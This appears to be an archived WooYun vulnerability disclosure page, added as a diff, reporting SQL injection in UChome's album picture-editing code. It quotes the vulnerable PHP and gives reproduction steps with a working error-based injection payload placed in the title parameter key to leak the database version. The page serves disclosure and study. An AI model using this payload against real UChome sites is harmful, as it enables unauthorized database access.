@@ -1,0 +1,233 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		UChome 注入漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		UChome 注入漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/Matt">Matt</a> 
+</li><li>提交时间：		2013-11-25 23:04</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-11-25：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-11-30：	厂商主动忽略漏洞，细节向第三方安全合作伙伴开放<br/>
+									2014-02-20：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">UChome 注入漏洞</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail"></p><pre><code>source/cp_clbum.php<br />
+} elseif($_GET[&#039;op&#039;] == &#039;editpic&#039;) {<br />
+	<br />
+	$managealbum = checkperm(&#039;managealbum&#039;);<br />
+	include_once(S_ROOT.&#039;./source/function_bbcode.php&#039;);<br />
+	<br />
+	if($albumid &gt; 0) {<br />
+		$query = $_SGLOBAL[&#039;db&#039;]-&gt;query(&quot;SELECT * FROM &quot;.tname(&#039;album&#039;).&quot; WHERE albumid=&#039;$albumid&#039;&quot;);<br />
+		if(!$album = $_SGLOBAL[&#039;db&#039;]-&gt;fetch_array($query)) {<br />
+			showmessage(&#039;no_privilege&#039;);<br />
+		}<br />
+		<br />
+		if($album[&#039;uid&#039;] != $_SGLOBAL[&#039;supe_uid&#039;] &amp;&amp; !$managealbum) {<br />
+			showmessage(&#039;no_privilege&#039;);<br />
+		}<br />
+	}<br />
+	<br />
+	if(submitcheck(&#039;editpicsubmit&#039;)) {<br />
+		if($_GET[&#039;subop&#039;] == &#039;delete&#039;) {<br />
+			//删除<br />
+			$updates = $deleteids = array();<br />
+			foreach ($_POST[&#039;title&#039;] as $picid =&gt; $value) {<br />
+				if(empty($_POST[&#039;ids&#039;][$picid])) {<br />
+					$title = getstr($value, 150, 1, 1, 1);<br />
+					<br />
+					$wherearr = array(&#039;picid&#039;=&gt;$picid);<br />
+					if(!$managealbum) $wherearr[&#039;uid&#039;]  = $_SGLOBAL[&#039;supe_uid&#039;];//自己<br />
+					<br />
+					updatetable(&#039;pic&#039;, array(&#039;title&#039;=&gt;$title), $wherearr);<br />
+				} else {<br />
+					$deleteids[$picid] = $picid;<br />
+				}<br />
+			}<br />
+			if($deleteids) {<br />
+				include_once(S_ROOT.&#039;./source/function_delete.php&#039;);<br />
+				deletepics($deleteids);<br />
+			}<br />
+			<br />
+		} elseif($_GET[&#039;subop&#039;] == &#039;update&#039;) {<br />
+			<br />
+			foreach ($_POST[&#039;title&#039;] as $picid =&gt; $value) {<br />
+				$title = getstr($value, 150, 1, 1, 1);//<br />
+				//echo 2222222;exit();<br />
+				$wherearr = array(&#039;picid&#039;=&gt;$picid);//这里可以看到KEY没有过滤~~<br />
+				if(!$managealbum) $wherearr[&#039;uid&#039;]  = $_SGLOBAL[&#039;supe_uid&#039;];//自己<br />
+<br />
+				updatetable(&#039;pic&#039;, array(&#039;title&#039;=&gt;$title), $wherearr);<br />
+			}</code></pre><p class='detail'> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">利用方法<br />
+<br />
+首先注册用户<br />
+<br />
+然后新建一个相册<br />
+<br />
+http://127.0.0.1/uchome/space.php?uid=2&amp;do=album&amp;view=me 打开这里点上床<br />
+<br />
+新建完了之后 上传一个图片<br />
+<br />
+完了之后 点进相册 然后在点刚刚上传的图片 点击管理图片<br />
+<br />
+直接确认 <br />
+<br />
+然后抓包<br />
+<br />
+把titie的那个改成<br />
+<br />
+title%5B1&#039; and (select 1 from  (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a)#%5D<br />
+<br />
+原始内容可能是title%5B1%5D 修改成上面的 就可以看到错误信息了<br />
+<br />
+</p><p class="detail"><a href="../images/25225920c992a286a8849c80c50ec44ab63bdff1.jpg" target="_blank"><img src="../images/25225920c992a286a8849c80c50ec44ab63bdff1.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/252259266c1882ed7bc4474d8bb46aa6e7a8f6e9.jpg" target="_blank"><img src="../images/252259266c1882ed7bc4474d8bb46aa6e7a8f6e9.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/252259354fc91d0218c6c12ef586e7ff0c1d8c05.jpg" target="_blank"><img src="../images/252259354fc91d0218c6c12ef586e7ff0c1d8c05.jpg" alt=".jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/25230103d1e1057277ef1710492f04548f7731cd.jpg" target="_blank"><img src="../images/25230103d1e1057277ef1710492f04548f7731cd.jpg" alt="4.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">你猜啊~~ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/Matt" title="Matt">Matt</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-044061" title="UChome 注入漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2013-11-30 23:04</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"></p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="44061";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
